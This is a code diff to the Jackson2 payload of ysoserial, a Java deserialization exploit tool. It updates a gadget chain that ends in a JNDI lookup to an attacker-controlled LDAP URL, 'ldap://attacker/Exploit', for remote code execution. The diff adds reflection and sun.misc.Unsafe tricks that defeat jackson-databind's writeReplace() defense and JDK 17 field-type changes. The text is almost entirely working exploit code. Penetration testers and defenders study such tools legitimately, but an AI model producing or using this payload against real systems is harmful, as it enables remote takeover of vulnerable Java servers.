@@ -1,9 +1,12 @@
 package ysoserial.payloads;
 
+import java.io.ObjectStreamClass;
+import java.lang.reflect.Field;
 import javax.management.BadAttributeValueExpException;
 
 import com.fasterxml.jackson.databind.node.POJONode;
 import com.sun.rowset.JdbcRowSetImpl;
+import sun.misc.Unsafe;
 
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
@@ -32,11 +35,12 @@ import ysoserial.payloads.util.Reflections;
 		- JNDI sink instead of bytecode loading
 		- Argument is a JNDI URL (ldap://attacker/Exploit)
 
-	Note: jackson-databind 2.14+ added writeReplace() defense.
-	Use < 2.14 for generation. Payload works on targets with any 2.x.
+	Note: jackson-databind 2.14+ added writeReplace() defense, backported to 2.12.7.1.
+	We clear it via ObjectStreamClass reflection at generation time.
+	Payload works on targets with any 2.x.
 
 	Requires:
-		jackson-databind 2.x (< 2.14 for generation)
+		jackson-databind 2.x (any version on target)
  */
 
 @SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@@ -51,8 +55,16 @@ public class Jackson2 extends PayloadRunner implements ObjectPayload<Object> {
 
 		POJONode pojoNode = new POJONode(rs);
 
+		// Clear writeReplace from BaseJsonNode's ObjectStreamClass descriptor
+		Jackson1.clearWriteReplace(POJONode.class);
+
 		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
-		Reflections.setFieldValue(val, "val", pojoNode);
+		// JDK 17+ changed val field type from Object to String — use Unsafe to bypass
+		final Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
+		unsafeField.setAccessible(true);
+		final Unsafe unsafe = (Unsafe) unsafeField.get(null);
+		final Field valField = BadAttributeValueExpException.class.getDeclaredField("val");
+		unsafe.putObject(val, unsafe.objectFieldOffset(valField), pojoNode);
 
 		return val;
 	}
